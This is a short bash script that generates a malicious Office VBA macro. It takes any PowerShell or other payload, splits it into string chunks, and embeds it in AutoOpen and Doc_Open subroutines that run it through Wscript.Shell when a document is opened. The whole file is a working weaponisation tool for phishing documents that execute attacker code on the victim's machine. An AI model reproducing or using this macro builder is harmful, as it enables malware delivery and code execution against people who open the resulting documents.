#!/bin/bash
echo "Enter your Powershell or other payload: "
read payload

cat <<eof

Sub AutoOpen()
        Logs
End Sub

Sub Doc_Open()
        Logs
End Sub

Sub Logs()
Dim Str As String
eof

echo -n $payload | fold -w 50 | sed -e 's/^/Str = Str + "/g' | sed -e 's/$/"/g'

cat <<eof

CreateObject("Wscript.Shell").Run Str

End Sub
eof
